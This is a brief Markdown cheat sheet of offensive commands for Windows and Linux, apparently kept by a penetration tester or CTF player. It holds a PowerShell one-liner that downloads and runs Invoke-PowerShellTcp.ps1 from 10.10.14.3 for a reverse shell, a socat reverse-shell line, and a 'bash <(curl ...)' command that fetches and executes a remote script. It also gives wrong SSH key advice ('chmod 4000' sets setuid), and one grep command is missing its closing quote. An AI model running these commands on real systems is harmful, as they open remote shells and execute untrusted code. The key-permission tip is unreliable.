# Windows

## List services

`wmic service where started=true get name, startname`

## Powershell reverse

`IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`

# Linux

## Reverse shells

* `socat file:’tty’,echo=0,raw udp-listen:4444`

## Get remote script and execute

`bash <(curl -s http://mywebsite.com/myscript.txt)`

## Find exclude specific words

`find / -type f -name "filename" 2>&1 | grep -v "Permission denied`
## ssh

### 使用 private key 登录

![AxtqoR.png](https://s2.ax1x.com/2019/04/16/AxtqoR.png)

修改 private key 权限，`chmod 4000`
